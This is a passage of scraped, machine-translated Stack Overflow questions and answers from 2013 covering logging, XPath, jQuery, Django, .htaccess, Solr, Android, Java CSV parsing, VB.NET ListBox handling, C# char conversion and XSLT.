您可以定期处理日志以将数据推送到某个公共存储。这不是实时的，但可能是一个非常简单的解决方案。这里的问题是，如果您需要按时间顺序排列来自不同服务器的日志条目，可能很难交错。

就个人而言，我为我拥有的每个实例集群设置了一个[Graylog](http://graylog2.org/)服务器，我将所有访问日志、错误日志等记录到该服务器上。它是基于 UDP 的，因此从应用程序服务器的角度来看它是一劳永逸的。它还提供了不错的搜索/查询工具。我个人喜欢这种方法，因为它完全从应用程序服务器中删除了日志管理。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T14:10:04.513

Two options that I've used:

*   Use syslog (or Syslog-NG) to log to a centralized location. We do this to ship our AWS log data offsite to our datacenter. Syslog-NG is more reliable than plain ole' Syslog and allows us to use MongoDB as a backing store.

*   Use logrotate to push your logs to S3\. It's not real-time like the Syslog solution, but it's a lot easier to set up and manage, especially if you have a lot of instances and aren't using a VPC

[Loggly](http://www.loggly.com) and [Splunk Storm](http://www.splunkstorm.com/?ac=storm_splunkdownload) are also two interesting SaaS products intended to solve this problem.

# xpath - XPath - 使用其展平的后代文本定位节点

> ID：14379394
> 
> 赞同：0
> 
> 时间：2013-01-17T12:42:26.200
> 
> 标签：xpath, selenium

我得到了这个 html：

```
<tr>
   <td>
       Some
       <strong>
           text
       </strong>
       <em>
           and more
       </em>
   </td>
   ...
</tr> 
```

我需要`td`用这个文本定位我的元素`Some text and more`。我知道我可以用这个 XPath 表达式得到这个文本：

```
//td//text() 
```

但我找不到定位`td`元素的解决方案。我试试这个：

```
//td[//text()='Some text and more'] 
```

但我得到错误。你知道一个有效的 XPath 表达式吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T12:46:09.757

首先，XPath 使用正斜杠，从不使用反斜杠。

其次，我相信这可能是您需要的 XPath：

```
//td[normalize-space(.) = 'Some text and more'] 
```

你能试试吗？

# android - 在 iOS 和 Android 中无需对话即可执行点赞和好友请求？

> ID：14379403
> 
> 赞同：0
> 
> 时间：2013-01-17T12:43:02.610
> 
> 标签：android, ios, xcode, facebook

我一直在寻找，但找不到解决我问题的有效方法。我的问题是是否可以从 iOS 和 Android 的 graphapi 或 facebook sdk 对 facebook 页面执行点赞，而不显示对话框。此外，我还想知道您是否可以以同样的方式提出好友请求，也适用于 Android 和 iOS。谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:47:43.853

这两个任务不能通过 Graph API 以编程方式获得，我怀疑它们永远不会。

原因是为了防止垃圾邮件和开发人员在他们的页面上偷偷获得喜欢。

您必须使用 Facebook 对话框来执行这些操作。

# android - 自定义视图实现的正确方法

> ID：14379407
> 
> 赞同：0
> 
> 时间：2013-01-17T12:43:24.540
> 
> 标签：android, view, custom-controls, onclicklistener

我需要实现这样一个元素 - 预定义大小的 TextView，底部有白色边框线。在 TextView 内部应该有一个具有预定义样式和大小的按钮。TextView 不应该是可点击的，而按钮应该是可点击的。我看到了一些可能的解决方案：

1）实现TableLayout并将我所有的按钮放入表格的行中。但是没有很好的解决方案 - 我的布局变得太长。所以我想到了另一种解决方案。

2) 将我的元素设为自定义视图。但问题是我需要通过我的应用程序使用很多这些元素，并且我需要对每个元素使用 onClickListener。我知道如何为所有项目实现 onClick() 方法，但是如何为每个项目使用单数 onClick() 方法？我应该如何构建这个自定义视图 - 它应该从 RelativeLayout 扩展，其中应该放置具有定义属性的 TextView 和 Button？

我也考虑过使用按钮，但在这种情况下，我的 TextView 也可以点击。

请告诉我哪种方法更简单，更方便。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T11:16:39.723

如果解决此问题，我使用了另一种方法。我将按钮和其他控件元素放入具有预定义 TableRow 样式的 TableLayout 中。在这种情况下，我不需要实现我需要使用相应的 TableRow 样式构建的 TextView 和边框边距。

# jquery - Jquery .style 未定义

> ID：14379413
> 
> 赞同：6
> 
> 时间：2013-01-17T12:43:33.633
> 
> 标签：jquery, styles, undefined

我的页面中有很多表格。某些表具有内联定义的 Width 属性 -

```
style="width:100%; ..." 
```

我需要得到所有这些表。我试过

```
$('.Forum_Container table').each(function () {
    var $this = $(this);
    if ($this.style != undefined) {
        if ($this.style.width == '100%') {
            ...
        }
    } else {
        ...
    }
}); 
```

但 $this.style 始终未定义。什么会导致这个问题？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-01-17T12:45:53.337

当您这样做时，`$(this)`您正在创建一个包含对该 DOM 元素的引用的 jQuery 对象。该`style`属性是 DOM 元素本身的属性，而不是 jQuery 对象，因此尝试访问它是行不通的（因为它*是*未定义的）。

要么`this`直接使用（实际的 DOM 节点） - 即`this.style.width`- 要么使用 jQuery 提供的函数来访问您需要的信息。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-01-17T12:45:33.620

jQuery 必须`.css()`获取元素样式属性：

```
if ($this.css("width") == '100%') {
    ...
} else {
    ...
} 
```

如果出于某种原因您想要原始样式，您可以从 DOM 元素本身获取它，而不是包装它的 jQuery 对象：

```
if (this.style != undefined) {
    if (this.style.width == '100%') {
        ...
    }
} else {
    ...
} 
```

这`this`将为您提供“原始”元素。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-04T18:57:51.547

`$this.prop('style').width`将在不使用原始元素的情况下工作。

我试图确定在早期的 javascript 中是否将边距设置为“auto”，`$this.prop('style').margin`并将返回带有单词“auto”的原始边距值，而`$this.css('margin')`返回计算值。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2013-01-17T12:45:45.557

“样式”不是 jQuery 方法。

“attr”或“prop”是你所追求的

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-01-17T12:45:51.190

您正在检查**jQuery object**`style`的属性，而不是 DOM 元素。您需要将 jQuery 对象转换为 DOM 元素，如下所示：

 **```
$('.Forum_Container table').each(function () {
    var $this = $(this),
        this_style = this.style;
    if (this_style != undefined) {
        if (this_style.width == '100%') {
            ...
        }
    } else {
        ...
    }
}); 
```

或者，如果您使用 jQuery，为什么不使用该[`.css()`](http://api.jquery.com/css/)方法？

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-17T12:45:59.433

使用`css()`功能：

```
$this.css('width') 
```

在你的`if`声明中：

```
$this.hasAttr('style') 
```**

# django - Django m2m 字段。通过具有多个外键（fk）的模型到相同的模型类型

> ID：14379415
> 
> 赞同：0
> 
> 时间：2013-01-17T12:43:47.127
> 
> 标签：django, django-models, many-to-many

我希望所有表中的所有实例都有一个对象实例。一对一的主键字段看起来是一种很好的方法。就像下面的一个小例子。

```
from util.fields import BigAutoField,BigForeignKey
from django.db import models

class Common_document(models.Model):
    pk = models.OneToOneField("Type_object", primary_key=True, related_name="common_document_content_pk")
    author = models.ManyToManyField("Type_object", related_name = 'common_document_author',
                                 limit_choices_to = {"Common_document_author_author":"Type_object"} ,null = True,
                                 through = 'Common_document_author', blank = True)
    #....

class Common_document_author(models.Model):
    pk = models.OneToOneField("Type_object", primary_key=True, related_name="common_document_author_pk")
    document = BigForeignKey("Common_document", related_name='Common_document_author_document')
    author = BigForeignKey("Type_object", related_name='Common_document_author_author')

class Type_object(models.Model):
    id = BigAutoField(primary_key=True)
    #....
    # Some of the fields are m2m 
```

但是，这给出了以下错误：

> django.core.management.base.CommandError：一个或多个模型未验证：schema.common_document：中间模型 Common_document_author 对 Type_object 有多个外键，这是不明确的，是不允许的。

如果我注释掉 document_author 表中的 pk 字段，则会删除此错误。我猜错误的出现是因为 django 不确定要使用的女巫对象 FK。我该如何解决？有没有办法告诉django m2m 表中的哪个字段用于m2m 字段？

我可能不会这样做。m2m 表可能不需要对象实例，但我仍然想知道如何做到这一点。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T18:57:58.103

我想我不明白你的动机。为什么要使用外键作为主索引？当然，索引它，但主要？您也可以尝试将其名称从“pk”更改，我相信 Django 对名为“pk”的字段做出了假设。

# apache - .htaccess 使用 Jekyll 重写子目录

> ID：14379422
> 
> 赞同：3
> 
> 时间：2013-01-17T12:44:18.603
> 
> 标签：apache, .htaccess, url-rewriting, blogs, jekyll

我在共享的 Apache 服务器上使用[Jekyll生成了一个小博客。](https://github.com/mojombo/jekyll)我一直在按照[本指南](http://zacht.me/zacht/site/articles/Deploy-Jekyll-With-A-Github-Webhook/)设置服务器，以便可以通过 GitHub 推送更改来更新站点，但我什至还没有做到这一点。`.htaccess`将域指向生成的`/_site`子目录的重写规则让我很难过。我正在使用的代码（如下）正确地重定向了站点，但是我读过的指南说此代码应该从 URL 中隐藏子目录，而这并没有发生。它在主页上正常工作，但子页面仍然`/_site/`在其 URL 中。有任何想法吗？

### [我的网站](http://joejoiner.tk)

### .htaccess 文件

```
RewriteEngine on
RewriteCond %{HTTP_HOST} ^(www.)?joejoiner.tk$ [NC]
RewriteCond %{REQUEST_URI} !^/_site/
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule ^(.*)$ /_site/$1
RewriteCond %{HTTP_HOST} ^(www.)?joejoiner.tk$ [NC]
RewriteRule ^(/)?$ _site/index.html [L] 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-25T18:51:21.200

`/`在上述代码块的第 6 行末尾添加一个尾随，如下所示：

```
RewriteRule ^(.*)$ /_site/$1/ 
```

# javascript - 如何使用 jQuery 为许多相似元素的父元素添加类

> ID：14379424
> 
> 赞同：2
> 
> 时间：2013-01-17T12:44:30.270
> 
> 标签：javascript, jquery, size, parent, addclass

我有这个标记：

```
<div class="fr_fieldsets_block">
   <fieldset>data</fieldset>
   <fieldset>data</fieldset>
   <fieldset>data</fieldset>
   <fieldset>data</fieldset>
</div>

<div class="fr_fieldsets_block">
   <fieldset>data</fieldset>
   <fieldset>data</fieldset>
</div> 
```

`fr_fieldsets_block`现在：如果元素超过 3 个，我需要为元素添加一些类`fieldset`。我尝试使用 size 方法，但函数为每个`fr_fieldsets_block`块添加我的愿望类。我怎样才能真正执行这个？这是我的js：

```
var fr_fieldsets_block = $('.fr_fieldsets_block'),
    filter_row_fieldset = fr_fieldsets_block.find('fieldset');
filter_row_fieldset.filter(function(){return $(this).size() >= 3;})
    .parent().addClass('scroll-pane'); 
```

thx，寻求帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:46:35.053

```
$('.fr_fieldsets_block').filter(function() {
   return $('fieldset', this).length > 2; // >= 3
}).addClass('scroll-pane'); 
```

[http://jsfiddle.net/5esLP/](http://jsfiddle.net/5esLP/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:47:09.137

```
if ($('.fr_fieldsets_block').find('fieldset').length >= 3)
 {
     $(this).addClass('scroll-pane');
 } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:57:23.223

```
 $(".fr_fieldsets_block").each(function(){
     var fieldSetLength=$(this).find('fieldset').length;
     if(fieldSetLength>3){
       $(this).addClass('newClass');
     }
   }); 
```

# solr - edismax 不支持 CommonGramsQueryFilterFactory？

> ID：14379429
> 
> 赞同：2
> 
> 时间：2013-01-17T12:44:50.997
> 
> 标签：solr

我将 SOLR 3.6 用于搜索服务器，并且具有以下`text_general`类型：

```
<fieldType name="text_general" class="solr.TextField" positionIncrementGap="100">
  <analyzer type="index">
    <charFilter class="solr.HTMLStripCharFilterFactory"/>
    <tokenizer class="solr.StandardTokenizerFactory"/>
    <filter class="solr.CommonGramsFilterFactory" words="stopwords.txt" ignoreCase="true" />
    <filter class="solr.StopFilterFactory" ignoreCase="true" words="stopwords.txt" enablePositionIncrements="true" />
    <!-- in this example, we will only use synonyms at query time
    <filter class="solr.SynonymFilterFactory" synonyms="index_synonyms.txt" ignoreCase="true" expand="false"/>
    -->
    <filter class="solr.LowerCaseFilterFactory"/>
    <filter class="solr.KeywordMarkerFilterFactory" protected="protwords.txt" /> 
    <filter class="solr.StemmerOverrideFilterFactory" dictionary="stemdict.txt" /> 
    <filter class="solr.PorterStemFilterFactory" />
  </analyzer>
  <analyzer type="query">
    <tokenizer class="solr.StandardTokenizerFactory"/>
    <filter class="solr.CommonGramsQueryFilterFactory" words="stopwords.txt" ignoreCase="true" />
    <filter class="solr.StopFilterFactory" ignoreCase="true" words="stopwords.txt" enablePositionIncrements="true" />
    <filter class="solr.SynonymFilterFactory" synonyms="synonyms.txt" ignoreCase="true" expand="true"/>
    <filter class="solr.LowerCaseFilterFactory"/>
    <filter class="solr.KeywordMarkerFilterFactory" protected="protwords.txt" /> 
    <filter class="solr.StemmerOverrideFilterFactory" dictionary="stemdict.txt" /> 
    <filter class="solr.PorterStemFilterFactory" />
  </analyzer>
</fieldType> 
```

但是我发现当我`edismax`用于搜索“to be or not to be”时，由于停用词配置，整个短语将被删除。但我确实`CommonGramsQueryFilterFactory`用于查询分析。调试显示：

```
<str name="rawquerystring">to be or not to be</str>
<str name="querystring">to be or not to be</str>
<str name="parsedquery">+()</str>
<str name="parsedquery_toString">+()</str> 
```

我哪里做错了？edismax 不支持 CommonGramsQueryFilterFactory？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-08-06T07:22:53.283

似乎 edismax 对查询进行了标记，并自己分析了每个术语。CommonGramsQueryFilter 应该获取所有单词以生成对，但在这种情况下，它获取术语“to”并且什么都不做，然后是术语“be”并且什么都不做等等。

因此，在这种情况下，CommonGramsQueryFilter 什么都不做，StopFilterFactory 会删除所有停用词并为您留下一个空查询。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-01T12:51:07.853

[http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters#solr.CommonGramsFilterFactory](http://wiki.apache.org/solr/AnalyzersTokenizersTokenFilters#solr.CommonGramsFilterFactory)说

> “通过组合常见标记（通常与停用词列表相同）和常规标记来制作带状疱疹（即 the_cat）。”

看起来它只结合了普通标记和常规标记。您正在尝试做的是将通用令牌与通用令牌结合起来，这可能是失败的原因。

我还没有尝试过，但正在考虑使用它并碰到你的问题和这篇文档。

# android - 如何将 .db 文件从资产放入 data/data/packagename/android

> ID：14379433
> 
> 赞同：2
> 
> 时间：2013-01-17T12:45:04.287
> 
> 标签：android, android-sqlite

> **可能重复：**
> [如何将现有数据库与 Android 应用程序一起使用](https://stackoverflow.com/questions/9109438/how-to-use-an-existing-database-with-an-android-application)

如何在不使用资产中复制 .db 文件内容的情况下将 .db 文件从资产放入 data/data/packagename/。我不想创建数据库，因为将 .db 文件放入资产中是没有用的。我对此进行了探索，但所有人都在再次创建数据库，但我只想直接放置该 .db 文件。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-17T12:55:51.640

用这个

```
private void copyDataBase() throws IOException {

    // Open your local db as the input stream
    InputStream myInput = myContext.getAssets().open(DB_NAME);
    // Path to the just created empty db
    String outFileName =  "/data/data/"
            +getApplicationContext().getPackageName()
            + "/databases/" + DB_NAME;
    // Open the empty db as the output stream
    OutputStream myOutput = new FileOutputStream(outFileName);
    // transfer bytes from the inputfile to the outputfile
    byte[] buffer = new byte[1024];
    int length;
    while ((length = myInput.read(buffer)) > 0) {
        myOutput.write(buffer, 0, length);

    }
    // Close the streams
    myOutput.flush();
    myOutput.close();
    myInput.close();
} 
```

# java - 通过“，”和“”解析csv

> ID：14379436
> 
> 赞同：-1
> 
> 时间：2013-01-17T12:45:20.210
> 
> 标签：java, parsing, csv

我有数据格式为的文件

```
userid, friend id, books id, cd id
1, 11 12 14 12, 223 256 333 234 222, 22
2, 78 22, 22 66 11 29, 76 455
3, 123 22 11 234 198 122 881, 34 12 98 64, 22 
```

我只需要使用用户 id 和 cd id，但我无法分隔这些字段。

我的Java代码如下。

```
BufferedReader in = new BufferedReader(new FileReader("CSV_test.txt"));

BufferedWriter ou =new BufferedWriter(new FileWriter("users.csv"));
String str;
str = in.readLine();

while ((str = in.readLine()) != null) {

  String[] ar = str.split(",");
  String[] ar1 = ar[1].split("");

  ou.write(ar[0]);
  ou.write(",");
  ou.write(ar1[1]);

  ou.newLine(); }
in.close();
ou.close();
} 
```

这有什么问题吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-01-17T12:48:50.757

你肯定想要

```
 String[] ar = str.split(",");
 String user = ar[0].trim();
 String cd = ar[3].trim(); 
```

请注意，我正在修剪以删除前导/尾随空格。

您可以使用拆分`", "`（注意尾随空格），这样就不需要进一步`trim()`. 但是，它确实对您的字段如何分隔（逗号？逗号和空格？）做出了一些假设，也许值得研究[CSV 库](http://opencsv.sourceforge.net/)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-01-17T12:51:17.683

无需重新发明轮子。虽然 CSV 解析相当简单，但有些事情可能有点复杂（例如转义字段值中的分隔符）。现有的库可以为您执行此操作，例如[OpenCSV](http://opencsv.sourceforge.net/)或[CsvJdbc](http://csvjdbc.sourceforge.net/)

# vb.net - 从 VB.net 中的 ListBox 中删除项目

> ID：14379438
> 
> 赞同：3
> 
> 时间：2013-01-17T12:45:27.110
> 
> 标签：vb.net

我有两个`ListBox1`和`ListBox2`。我通过选择项目将项目插入到`ListBox2`具有以下代码的项目中`ListBox1`：

```
da6 = New SqlDataAdapter("select distinct(component_type) from component where   component_name='" & ListBox1.SelectedItem() & "'", con)
da6.Fill(ds6, "component")
For Each row As DataRow In ds6.Tables(0).Rows
    ListBox2.Items.Add(row.Field(Of String)("component_type"))
Next 
```

但是当我重新选择另一个项目时，`ListBox1`会`ListBox2`显示预加载项目和现在一起加载的项目。我只希望现在加载的项目显示在列表框中。我使用了这段代码，但问题没有解决：

```
For i =0 To ListBox2.items.count - 1
    ListBox2.Items.removeAt(i)
Next 
```

或者 `listbox2.items.clear()`也不行..

如何清除 中的所有项目`ListBox2`？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-01-17T12:48:08.067

简单地使用：

```
ListBox2.Items.Clear() 
```

*   考虑您的最后一次编辑：在添加新项目**之前执行此操作**

MSDN：[`ListBox.ObjectCollection.Clear`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.objectcollection.clear.aspx)

> 从集合中删除所有项目。

请注意，您的方法的问题是[`RemoveAt`](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.objectcollection.removeat.aspx)更改了所有剩余项目的索引。

> 从列表中删除项目时，列表**中后续项目的索引会更改**。有关已删除项目的所有信息都将被删除。您可以使用此方法通过指定要从列表中删除的项目的索引来从列表中删除特定项目。要指定要删除的项目而不是项目的索引，请使用 Remove 方法。**要从列表中删除所有项目，请使用 Clear 方法**。

如果您仍然想使用`RemoveAt`，您可以倒退，例如：

一个`for`循环：

```
For i As Int32 = ListBox2.Items.Count To 0 Step -1
    ListBox2.Items.RemoveAt(i)
Next 
```

或一个`while`

```
While ListBox2.Items.Count > 0
    ListBox2.Items.RemoveAt(ListBox2.Items.Count - 1)
End While 
```

~~旧的 C# 代码~~

 ~~```
for (int i = ListBox2.Items.Count - 1; i >= 0; i--)
    ListBox2.Items.RemoveAt(i);

while(ListBox2.Items.Count > 0)
    ListBox2.Items.RemoveAt(ListBox2.Items.Count - 1); 
```~~  ~~* * *

## 回答 #2

> 赞同：5
> 
> 时间：2015-02-03T20:09:12.817

这段代码对我有用：

ListBox1.Items.RemoveAt(ListBox1.SelectedIndex)

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-01-17T12:48:14.387

如果只想清除列表框，则应使用 Clear ( [winforms](http://msdn.microsoft.com/en-us/library/system.windows.forms.listbox.objectcollection.clear.aspx) | [wpf](http://msdn.microsoft.com/en-us/library/system.windows.controls.itemcollection.clear.aspx) | [asp.net](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.listitemcollection.clear.aspx) ) 方法：

```
ListBox2.Items.Clear() 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2014-02-06T10:43:18.240

有一种简单的方法可以删除选定的项目，而所有这些人都在寻求一种硬方法：

```
lstYOURVARIABLE.Items.Remove(lstYOURVARIABLE.SelectedItem) 
```

我在 Visual Studio 的 Visual Basic 模式下使用了它。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2014-01-05T02:04:17.290

这是我想出的从列表框中删除用户选择的项目的代码它似乎在多选列表框中工作正常（selectionmode 属性设置为多扩展）。：

```
Private Sub cmdRemoveList_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles cmdRemoveList.Click
    Dim knt As Integer = lstwhatever.SelectedIndices.Count
    Dim i As Integer
    For i = 0 To knt - 1
        lstwhatever.Items.RemoveAt(lstwhatever.SelectedIndex)
    Next
End Sub 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2015-10-08T22:51:28.523

我已经测试过了，效果很好

```
For i =0 To ListBox2.items.count - 1
ListBox2.Items.removeAt(0)
Next 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2016-01-27T15:20:40.100

我认为您的 ListBox 已经用 ListBox2.Items.Clear() 清除了。问题是您还需要使用 ds6.Tables.Clear() 从以前的结果中清除数据集。

在你的代码中添加这个：

```
da6 = New SqlDataAdapter("select distinct(component_type) from component where   component_name='" & ListBox1.SelectedItem() & "'", con)
    ListBox1.Items.Clear()    ' clears ListBox1
    ListBox2.Items.Clear()    ' clears ListBox2
    ds6.Tables.Clear()        ' clears DataSet  <======= DON'T FORGET TO DO THIS
da6.Fill(ds6, "component")
For Each row As DataRow In ds6.Tables(0).Rows
    ListBox2.Items.Add(row.Field(Of String)("component_type"))
Next 
```

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2017-07-19T18:13:57.103

这对我有用。

```
Private Sub listbox_MouseDoubleClick(sender As Object, e As MouseEventArgs) 
        Handles listbox.MouseDoubleClick
        listbox.Items.RemoveAt(listbox.SelectedIndex.ToString())
    End Sub 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2015-12-15T15:44:01.610

```
 Dim ca As Integer = ListBox1.Items.Count().ToString
    While Not ca = 0
        ca = ca - 1
        ListBox1.Items.RemoveAt(ca)
    End While 
```~~

# c# - 为什么 Visual Studio 在将 int 转换为 char 时会在 int 的开头添加斜杠？

> ID：14379440
> 
> 赞同：1
> 
> 时间：2013-01-17T12:45:33.077
> 
> 标签：c#, type-conversion

为什么 Visual Studio 在将 int 转换为 char 时会在 int 的开头添加斜杠？

当我转换`int 0`为 时`char`，它会更改为`\0`。为什么？我需要字符 0。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:47:10.287

`\0`这就是 Visual Studio`null`在调试窗口中显示角色的方式。

这`\`是一个转义序列，所以`\0`告诉你这是`null`字符。

如果需要*字符* `0`，则需要为该字符使用正确的 ASCII 值 - 48。

```
char n = (char)0; // The _null_ character, displayed \0
char z = (char)48; // The character 0
char z2 = '0'; // The character 0, using a character literal 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:47:12.703

接收 char '0' 将`int`48 转换为`char`或简单地分配

```
var c = '0'; 
```

当您将`int`0转换为时，`char`您会在小数点 0 处收到 ASCII 符号，即为空。Char '0' 的 ASCII 值为 48，因此将 48 转换为 char 将导致 '0' `char`。

[在ASCII Table](http://www.asciitable.com/)中检查 ASCII 符号及其十进制表示。请记住，无论何时转换`int`为`char`，都会考虑到这个 ASCII 表

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-17T12:48:31.373

如果你想要 char 0，你需要使用一个字符文字：

```
'0' 
```

或者，您可以使用

```
0.ToString()[0] 
```

取决于价值的来源。

`\0`是 ASCII 值为 0 的字符的转义序列，这与数字 0 的字符不同。

# html - 用于 HTML5 移动应用程序的 pushshap

> ID：14379442
> 
> 赞同：1
> 
> 时间：2013-01-17T12:45:38.340
> 
> 标签：html, pushsharp

我正在关注以下文章：

网址：[https ://github.com/Redth/PushSharp/wiki/How-to-Configure-&-Send-Apple-Push-Notifications-using-PushSharp](https://github.com/Redth/PushSharp/wiki/How-to-Configure-&-Send-Apple-Push-Notifications-using-PushSharp)

步骤 1 到步骤 20 转换成功。

现在关注文章的第 21 步和第 22 步有一些代码在 HTML5 Web 应用程序中不起作用。

@Experts：如果有人在 HTML5 Web 应用程序上实现了这个，请帮助我。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T14:22:09.373

我设法使用 Phonegap/Cordova 来实现它。

我在用于发送通知的 Windows 服务中使用了来自[PushSharp的代码。](https://github.com/Redth/PushSharp/wiki/How-to-Configure-&-Send-Apple-Push-Notifications-using-PushSharp)

Javascript API 用于在客户端 (html) 注册/处理传入通知。

# xml - 未应用副本上的 XSLT 更改/覆盖属性（使用 saxon ）

> ID：14379447
> 
> 赞同：0
> 
> 时间：2013-01-17T12:45:51.460
> 
> 标签：xml, xslt, saxon

我有一个这样的xslt：

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet xmlns:db="http://www.liquibase.org/xml/ns/dbchangelog"  xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">
  <xsl:output method="xml"  indent="yes" />
  <xsl:template match="/">    
      <xsl:for-each select="db:databaseChangeLog/db:changeSet"> 
          <xsl:if test="name(*[1])='createTable'">  
          <xsl:result-document  href="base/tables/{position()}_{name(*[1])}_{*[1]/@tableName}.xml">
           <databaseChangeLog 
                xmlns="http://www.liquibase.org/xml/ns/dbchangelog" 
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
                xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-2.0.xsd">

                <xsl:copy-of select="."/>                       

                <xsl:copy-of select="../db:changeSet[name(*[1])='createIndex' and *[1]/@tableName= current()/*[1]/@tableName ]" />

            </databaseChangeLog> 
        </xsl:result-document>      
        </xsl:if> 
      </xsl:for-each>     
  </xsl:template>

  <xsl:template match="@* | node()" mode="copy">
       <xsl:copy>
          <xsl:apply-templates select="@* | node()"/>
       </xsl:copy>
   </xsl:template>

    <xsl:template match="db:changeSet/@author" mode="copy">
        <xsl:attribute name="author">
            <xsl:value-of select="'sakhunzai'"/>
        </xsl:attribute>
    </xsl:template>

</xsl:stylesheet> 
```

# XML 部分文件

```
<changeSet author="xxx (generated)" id="1358259674512-26">
        <createIndex indexName="category_id" tableName="teams" unique="false">
            <column name="audience_id"/>
        </createIndex>
</changeSet>
<changeSet author="xxx (generated)" id="1358259674512-29">
    <createIndex indexName="id" tableName="users" unique="false">
        <column name="id"/>
        <column name="career_lead_id"/>
    </createIndex>
</changeSet> 
```

我想覆盖 changeSet 的属性值（作者和 id）。请帮我修复 xslt。

一切正常，但@author atrribute 值在目标 xml 文件中没有改变注意：由于 xsltproc 失败，我切换到基于 saxon java 的处理器，例如

`java -jar /usr/local/liquibase/saxon/saxon9he.jar common.xml table.xslt`

# **工作 XSLT**

```
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet xmlns:db="http://www.liquibase.org/xml/ns/dbchangelog"  xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="2.0">
  <xsl:output method="xml"  indent="yes" />
  <xsl:template match="/">    
      <xsl:for-each select="db:databaseChangeLog/db:changeSet[db:createTable]"> 
          <xsl:result-document  href="base/tables/{position()}_{name(*[1])}_{*[1]/@tableName}.xml">
           <databaseChangeLog 
                xmlns="http://www.liquibase.org/xml/ns/dbchangelog" 
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
                xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-2.0.xsd">

                <xsl:apply-templates select="." mode="copy"/>                       

                <xsl:apply-templates select="../db:changeSet[db:createIndex and *[1]/@tableName= current()/*[1]/@tableName ]"  mode="copy"/>

            </databaseChangeLog> 
        </xsl:result-document>
      </xsl:for-each>     
  </xsl:template>

  <xsl:template match="node()" mode="copy">
      <xsl:copy>
          <xsl:attribute name="author">sakhunzai</xsl:attribute>
           <xsl:copy-of select="@id|node()"/>
      </xsl:copy>
   </xsl:template>

</xsl:stylesheet> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T13:15:04.267

`<xsl:copy-of />`不会导致应用模板。它只是创建一个精确的副本。改变这条线怎么样

```
<xsl:template match="db:changeSet/@author"> 
```

对此：

```
<xsl:template match="db:changeSet/@author" mode="copy"> 
```

添加此模板：

```
<xsl:template match="@* | node()" mode="copy">
    <xsl:copy>
        <xsl:apply-templates select="@* | node()"/>
    </xsl:copy>
</xsl:template> 
```

最后改变这个：

```
<xsl:copy-of select="../db:changeSet[name(*[1])='createIndex' and *[1]/@tableName= current()/*[1]/@tableName ]">
    <xsl:copy-of select="."/>                       
</xsl:copy-of> 
```

对此：

```
<xsl:apply-templates 
   select=="../db:changeSet[name(*[1])='createIndex' and *[1]/@tableName = current()/*[1]/@tableName]" 
   mode="copy" /> 
```

作为旁注，这看起来有点多余：

```
<xsl:copy-of select="current()[name()='changeSet']">                        
    <xsl:copy-of select="."/>
</xsl:copy-of> 
```

由于 for-each 循环，当前节点必须具有名称“changeSet”。我相信这应该足够了：

```
<xsl:copy-of select="." /> 
```

完整的 XSLT：

```
<xsl:stylesheet xmlns:db="http://www.liquibase.org/xml/ns/dbchangelog"  xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output method="xml"  indent="yes" />
  <xsl:template match="/">    
      <xsl:for-each select="db:databaseChangeLog/db:changeSet"> 
          <xsl:if test="name(*[1])='createTable'">  
          <xsl:document href="base/tables/{position()}_{name(*[1])}_{*[1]/@tableName}.xml">
           <databaseChangeLog 
                xmlns="http://www.liquibase.org/xml/ns/dbchangelog" 
                xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
                xsi:schemaLocation="http://www.liquibase.org/xml/ns/dbchangelog http://www.liquibase.org/xml/ns/dbchangelog/dbchangelog-2.0.xsd">

